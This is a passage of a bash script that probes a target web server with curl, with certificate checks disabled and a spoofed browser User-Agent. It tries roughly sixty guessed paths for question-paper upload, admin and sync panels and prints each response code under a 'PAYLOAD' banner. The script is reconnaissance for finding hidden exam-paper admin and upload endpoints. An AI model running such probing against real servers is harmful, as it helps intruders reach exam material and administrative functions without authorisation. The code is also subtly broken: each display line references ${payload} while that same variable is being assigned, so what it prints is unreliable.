code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AdminQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AdminQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderPanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderPanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
